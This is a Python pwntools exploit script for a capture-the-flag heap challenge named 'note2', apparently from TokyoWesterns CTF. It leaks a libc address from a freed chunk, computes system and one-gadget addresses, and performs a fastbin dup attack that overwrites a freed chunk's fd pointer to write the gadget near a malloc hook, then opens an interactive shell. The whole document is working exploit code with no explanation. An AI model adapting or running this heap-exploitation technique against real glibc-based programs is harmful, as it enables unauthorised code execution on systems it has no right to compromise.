from pwn import *
import sys, time

context.binary = "./note2"
binary = ELF("./note2")
libc = ELF("./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71")

#context.log_level = "debug"

if len(sys.argv) == 1:
    p = process(["./note2"])#, env={"LD_PRELOAD":"./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71"})
    log.info("PID : " + str(proc.pidof(p)[0]))
    pause()

else:
    p = remote("pwn2.chal.ctf.westerns.tokyo", "18554")


def add(size, data, sending=False):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("note.")
    p.sendline(str(size))
    p.recvuntil("content of the note.")
    if sending:
        p.send(data)
    else:
        p.sendline(data)

def delete(idx):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("note.")
    p.sendline(str(idx))
    p.recvuntil("Success!\n")

def show(idx):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("note.")
    p.sendline(str(idx))
    p.recvuntil("Content:")

add(0x10, "Q" * 0xf, True)      # index 0   0x20
add(0x88, "A" * 0x87, True)     # index 1   0x90
add(0x60, "BBBB")      # index 2   0x80
#add(0x10, "/bin/sh\x00")      # index 3
delete(1)
add(0x88, "C" * 7)              # index 1           allocate 4times
show(1)

p.recvuntil("C" *  7 + "\n")
leak = u64(p.recv(6).ljust(8, "\x00"))          # leak main_arena + 88
libc_base = leak - 0x3c4b78
system = libc_base + libc.symbols["system"]
binsh = libc_base + 0x18cd17
magic = libc_base + 0xf1117

main_arena = leak - 88
duphook = main_arena - 0x2b - 8
#duphook = main_arena + 0x1c75

log.info("Leak : " + hex(leak))
log.info("system : " + hex(system))
log.info("binsh : " + hex(binsh))

# fastbin dup attack
delete(2)
delete(0)

exp = "A" * 0x10 + p64(0x20) + p64(0x91) + "B" * 0x80
exp += p64(0x90) + p64(0x71) + p64(duphook)     # overwrite fd

add(0, exp)
add(0x60, p64(duphook))
pause()
add(0x60, "\x00" * 0x13 + p64(magic))

'''
delete(0)           # delete index 0
delete(2)           # delete index 2
add(0x10, "")       # insert index 0        second fastbin chunk
show(0)
heap = u64(p.recv(5).ljust(8, "\x00").replace("\n", "\x00"))
log.info("Heap leak : " + hex(heap))
top = heap + 0x120
add(0x10, p64(0xcafebabe))      # insert index2
main_arena = leak - 88
duphook = main_arena - 0x2b
log.info("main_arena : " + hex(main_arena))
'''

p.interactive()
